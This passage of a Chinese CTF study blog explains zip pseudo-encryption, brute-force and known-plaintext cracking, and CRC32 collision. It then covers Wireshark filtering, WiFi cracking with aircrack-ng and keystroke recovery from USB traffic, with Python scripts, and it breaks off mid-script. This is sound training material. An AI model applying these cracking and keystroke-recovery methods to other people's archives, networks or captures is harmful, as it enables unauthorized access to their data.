<p><img src="https://img.npfs06.top/20210325154213.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">如果是加密的zip文件，两处都标记的是09 00（注意不同的压缩软件有差异，有些好像是01 00）</p>
<p> <img src="https://img.npfs06.top/20210325154316.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>若将未加密的zip文件中的压缩源文件目录区的全局方式位标记改为01 00 （或者09  00），就会被压缩软件认为已加密，这就是所谓的伪加密了</p>
<p><img src="https://img.npfs06.top/20210325154356.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"> </p>
<p>破解伪加密的zip，只要把压缩文件目录区的全局方式标记改为00 00 （除windows外的系统（如kali） 可直接打开伪加密压缩包）</p>
<p><img src="https://img.npfs06.top/20210325154415.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"> </p>
<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><p>爆破：逐个尝试选定集合中的可以组成的所有密码，直到遇到正确的密码。分为暴力破解、掩码破解、字典破解这几种</p>
<p>1、暴力破解：选择密码范围，长度等，由软件组合生成密码进行破解</p>
<p>2、掩码破解：知道密码中的一部分，只需要按照规则构造其余部分进行破解</p>
<p>3、字典破解：通常是多数用户常用的一些密码集合，导入字典文件用字典中的密码进行破解（取决你  的字典）</p>
<p>这里可以使用Windows下的一款神器AZPR，也可以自己动手用python写个爆破的脚本。</p>
<p> <img src="https://img.npfs06.top/20210325154456.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h1 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h1><p>明文攻击（Known plaintext attack）：是一种攻击模式，指攻击者已知明文、密文及算法，求密钥的过程。</p>
<p>明文攻击是一种较为高效的攻击手段，如：当你不知道一个zip压缩包文件的密码，但是你有zip中的一  个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有压缩文件使用同一个加密密  钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。</p>
<p>简单来说就是，zip明文攻击就是利用已知文件找到加密密钥，利用密钥来解释其他加密文件，因为zip  压缩包里的所有文件都是使用同一个加密密钥来加密的。</p>
<p>这里举个例子：</p>
<p>现在我压缩了带密码的四个文件，已知明文攻击测试.zip中的明文攻击.docx</p>
<p><img src="https://img.npfs06.top/20210325154548.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p> 进行对已知文件进行压缩，对比crc值是否跟加密文件中的crc值一致</p>
<p><img src="https://img.npfs06.top/20210325154844.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>利用AZPR进行明文攻击</p>
<p> <img src="http://img.npfs06.top/20210325155026.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p> 成功获取到密文</p>
<p>注意：当明文的大小比较小时，或者密文过长，攻击速度会比较慢；即使有时没有恢复密码，也可以使  用明文攻击，最后点保存还是能得到压缩包里内容的，如果出现错误可以多试几款压缩软件。</p>
<p><img src="https://img.npfs06.top/20210325155134.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h1 id="CRC32碰撞"><a href="#CRC32碰撞" class="headerlink" title="CRC32碰撞"></a>CRC32碰撞</h1><p>CRC32：CRC本身是“冗余校验码”的意思，CRC32则标识会产生一个32bit（8位十六进制）的校验值。</p>
<p>CRC校验实用程序库，在数据存储和数据通讯领域，为了保证数据的正确，就不得不采用检错的手段。  在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。</p>
<p>在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同  的CRC32值，利用这个原理我们可以直接爆破出加密文件中的内容。</p>
<p>每个文件都有唯一的CRC32值，即便数据中一个bit发生变化，也会导致CRC32值不同。若是知道一段数   据的长度和CRC32值，便可穷举数据，与其CRC32对照，以此达到暴力猜解的目的。但限于CPU的能力，通常只适用于较小文本文件。</p>
<p>bugku中的例子脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">dicts = string.printable <span class="comment"># 可打印字符的字符串。ascii码33-126号</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collision_crc</span>(<span class="params">crc</span>):</span></span><br><span class="line">    <span class="keyword">global</span> out_file</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> dicts:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> dicts:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> dicts:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> dicts:</span><br><span class="line">                    strings = a + b + c + d</span><br><span class="line">                    strings = strings.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(strings)):</span><br><span class="line">                        out_file.write(strings.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                        <span class="comment"># print(strings)</span></span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 以上定义一个方法，组合随机字符与CRC进行碰撞，判断如果相等及写入 文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">obtain_zip</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">&#x27;out&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">        zip_file = zipfile.ZipFile(file, <span class="string">&#x27;r&#x27;</span>) <span class="comment"># 读取创建zip_file对象</span></span><br><span class="line">        get_crc = zip_file.getinfo(<span class="string">&#x27;data.txt&#x27;</span>) <span class="comment"># 压缩文件夹里的data.txt文件，获取文 档内指定的文件信息</span></span><br><span class="line">        crc = get_crc.CRC <span class="comment"># 以上定义一个方法，获取68个zip的CRC的值</span></span><br><span class="line">        collision_crc(crc) <span class="comment"># 再调用collision方法传参</span></span><br><span class="line">out_file = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">obtain_zip()</span><br><span class="line">out_file.close()</span><br><span class="line">out_file2 = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.rar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> rar:</span><br><span class="line">    rar.write(base64.b64decode(out_file2.read())) <span class="comment"># 二进制将转换后的base64位写入文 件</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title>day3 misc(流量)</title>
    <url>/2020/05/16/day3-misc-%E6%B5%81%E9%87%8F/</url>
    <content><![CDATA[<p>在CTF比赛中，对于流量包的分析取证是一种十分重要的题型。通常这类题目都是会提供一个包含流量数据的pcap文件<a id="more"></a></p>
<h1 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h1><h2 id="常用过滤命令："><a href="#常用过滤命令：" class="headerlink" title="常用过滤命令："></a>常用过滤命令：</h2><p><strong>过滤IP，如源IP或者目标x.x.x.x</strong></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">ip.src <span class="keyword">eq</span> <span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span> <span class="keyword">or</span> ip.dst <span class="keyword">eq</span> <span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span></span><br><span class="line">或者</span><br><span class="line">ip.addr <span class="keyword">eq</span> <span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span> </span><br></pre></td></tr></table></figure>
<p>也可以：点击任意一个符合筛选条件的数据包，找到IPv4下的Destination字          段，右键点击Source字段，作为过滤器应用 – 选中。</p>
<p><strong>过滤端口</strong></p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="title">tcp</span>.<span class="keyword">port</span> eq 80 // 不管端口是来源的还是目标的都显示</span><br><span class="line"><span class="title">tcp</span>.<span class="keyword">port</span> eq 80 or udp.<span class="keyword">port</span> eq 80</span><br><span class="line"><span class="title">tcp</span>.dst<span class="keyword">port</span> == 80 // 只显tcp协议的目标端口80</span><br><span class="line"><span class="title">tcp</span>.src<span class="keyword">port</span> == 80 // 只显tcp协议的来源端口80</span><br><span class="line">过滤端口范围</span><br><span class="line"><span class="title">tcp</span>.<span class="keyword">port</span> &gt;= 1 and tcp.<span class="keyword">port</span> &lt;= 80</span><br></pre></td></tr></table></figure>
<p><strong>过滤协议</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">tcp<span class="regexp">/udp/</span>arp<span class="regexp">/icmp/</span>http<span class="regexp">/smtp/</span>ftp<span class="regexp">/dns/m</span>snms<span class="regexp">/ip/</span>ssl......</span><br><span class="line"></span><br><span class="line">排除tcp包，如!tcp   或者   not tcp</span><br></pre></td></tr></table></figure>
<p><strong>http模式过滤</strong></p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line">http.request.method == <span class="string">&quot;<span class="keyword">GET</span>&quot;</span></span><br><span class="line">http.request.method == <span class="string">&quot;<span class="keyword">POST</span>&quot;</span></span><br><span class="line">http.request.uri == <span class="string">&quot;/img/logo-edu.gif&quot;</span></span><br><span class="line">http contains <span class="string">&quot;<span class="keyword">GET</span>&quot;</span></span><br><span class="line">http contains <span class="string">&quot;HTTP/1.&quot;</span></span><br><span class="line"></span><br><span class="line">// GET包</span><br><span class="line">http.request.method == <span class="string">&quot;<span class="keyword">GET</span>&quot;</span> &amp;&amp; http contains <span class="string">&quot;Host: &quot;</span></span><br><span class="line">http.request.method == <span class="string">&quot;<span class="keyword">GET</span>&quot;</span> &amp;&amp; http contains <span class="string">&quot;User-Agent: &quot;</span></span><br><span class="line"></span><br><span class="line">// POST包</span><br><span class="line">http.request.method == <span class="string">&quot;<span class="keyword">POST</span>&quot;</span> &amp;&amp; http contains <span class="string">&quot;Host: &quot;</span></span><br><span class="line">http.request.method == <span class="string">&quot;<span class="keyword">POST</span>&quot;</span> &amp;&amp; http contains <span class="string">&quot;User-Agent: &quot;</span></span><br><span class="line"></span><br><span class="line">// 响应包</span><br><span class="line">http contains <span class="string">&quot;HTTP/1.1 200 OK&quot;</span> &amp;&amp; http contains <span class="string">&quot;Content-Type: &quot;</span></span><br><span class="line">http contains <span class="string">&quot;HTTP/1.0 200 OK&quot;</span> &amp;&amp; http contains <span class="string">&quot;Content-Type: &quot;</span></span><br><span class="line">一定包含如下</span><br><span class="line">`Content-Type:`</span><br></pre></td></tr></table></figure>

<p>其他过滤命令参见<a href="https://blog.csdn.net/wojiaopanpan/article/details/69944970" target="_blank">wireshark过滤规则及使用方法</a></p>
<h2 id="协议分级"><a href="#协议分级" class="headerlink" title="协议分级"></a>协议分级</h2><p>可以查看当前数据包中包含那些协议</p>
<blockquote>
<p>统计 -&gt; 协议分级</p>
</blockquote>
<p>根据数据包特征进行筛选：右键-&gt;作为过滤器应用 -&gt;选中/非选中</p>
<h2 id="数据流跟踪"><a href="#数据流跟踪" class="headerlink" title="数据流跟踪"></a>数据流跟踪</h2><p>在关注的http数据包或tcp数据包中选择流汇聚，可以将HTTP流或TCP流汇聚或还原成数据，在弹出的框中可以看到数据内容。</p>
<blockquote>
<p>选中数据分组后   右键 -&gt;追踪流 -&gt;TCP/HTTP流</p>
</blockquote>
<p>HTTP流常见关键内容：</p>
<p>1.打开即可看到flag</p>
<p>2.上传/下载文件内容，内容包括文件名、hash值等</p>
<p>3.一句话木马</p>
<p>而TCP流通常是命令行操作</p>
<h2 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h2><p>使用wireshark可以自动提取通过http传输的文件内容，方法如下：</p>
<blockquote>
<p>文件-&gt;导出对象-&gt;HTTP</p>
</blockquote>
<p>在打开的对象列表中找到有价值的文件，如压缩文件、文本文件、音频文件、图片等，点击save进行保存，或者saveall保存所有对象再进入文件夹进行分析。</p>
<blockquote>
<p>media type -&gt;右键-&gt;导出分组字节流</p>
</blockquote>
<blockquote>
<p>文件-&gt;导出分组字节流</p>
</blockquote>
<blockquote>
<p>选中http文件传输流量包，在分组详情中找到data或者Line-based text data:text/html层，鼠标右键点击 – 选中 导出分组字节流。</p>
</blockquote>
<h1 id="无线wifi流量包"><a href="#无线wifi流量包" class="headerlink" title="无线wifi流量包"></a>无线wifi流量包</h1><p>协议分级发现只有wireless LAN协议，很可能是WPA或者WEP加密的无线数据包</p>
<p><strong>aircrack-ng</strong></p>
<p>Linux下用aircrack-ng检查cap包</p>
<p><code>aircrack-ng  xxx.cap -w 字典</code></p>
<h1 id="USB流量包分析"><a href="#USB流量包分析" class="headerlink" title="USB流量包分析"></a>USB流量包分析</h1><p>USB流量指的是USB设备接口的流量，攻击者能够通过监听usb接口流量获取键盘敲击键、鼠标移动与点击、存储设备的铭文传输通信、USB无线网卡网络传输内容等等。在CTF中，USB流量分析主要以键盘和鼠标流量为主。</p>
<h2 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h2><p>USB协议数据部分在Leftover Capture Data域中，数据长度为<code>八个字节</code>。其中键盘击键信息集中在第三个字节中。<br><img src="https://img.npfs06.top/20210325160246.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>如图，发现击键信息为0x06，即对应的按键为<code>C</code><br>键位映射关系参考：<a href="https://wenku.baidu.com/view/9050c3c3af45b307e971971e.html">《USB键盘协议中键码》中的HID Usage ID</a></p>
<h3 id="题型："><a href="#题型：" class="headerlink" title="题型："></a>题型：</h3><p>flag隐藏在usb流量中，通过USB协议数据中的键盘键码转换成键位。</p>
<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>1.使用kali linux中的tshark 命令把cap data提取出来：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class="line">tshark -r usb.pcap -T fields -e usb.capdata | sed &#x27;/^\s*$/d&#x27; &gt; usbdata.txt #提取并去除空行</span><br></pre></td></tr></table></figure>
<p>2.根据《USB键盘协议中键码》中的HID Usage ID将数据还原成键位，可写一个Python脚本进行快速转换。</p>
<h3 id="题目示例："><a href="#题目示例：" class="headerlink" title="题目示例："></a>题目示例：</h3><p><a href="https://pan.baidu.com/s/1bGEIPeXDCbhybmWOyGr8Og">【NSCTF】安全评测人员在对某银行卡密码输入系统进行渗透测试，截获了一段通过USB键盘输入6位数字密码的流量，其中也包含了一些其他无关的USB设备的流量，你能从中恢复出6位数字密码吗？最终提交的flag格式为flag</a><br>提取码：q6ro<br>（1）使用tshark 命令把pcap的数据提取并去除空行到<code>usbdata.txt</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata | sed &#x27;/^\s*$/d&#x27; &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210325160311.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br>（2）提取出来的数据可能会带冒号，也可能不带（有可能和wireshark的版本相关），但是一般的脚本都会按照有冒号的数据来识别</p>
<blockquote>
<p>有冒号时提取数据的<code>[6:8]</code><br>无冒号时数据在<code>[4:6]</code></p>
</blockquote>
<p>可以用脚本来加上冒号</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>: <span class="comment"># 鼠标流量的话len改为8</span></span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure>
<p>此时对应的第三字节，也就是[6:8]就代表了击键信息<br>（3）提取出键盘流量后需要用脚本还原数据对应的信息。同时找到两个还原信息的脚本（python2）：<br><code>keyboard1.py</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;output :\n&#x27;</span> + output</span><br><span class="line">keyboard2.py</span><br><span class="line">normalKeys = &#123;</span><br><span class="line">    <span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line">    <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line">     <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line">      <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line">       <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line">        <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line">         <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line">         <span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,</span><br><span class="line">         <span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line">         <span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line">         <span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span 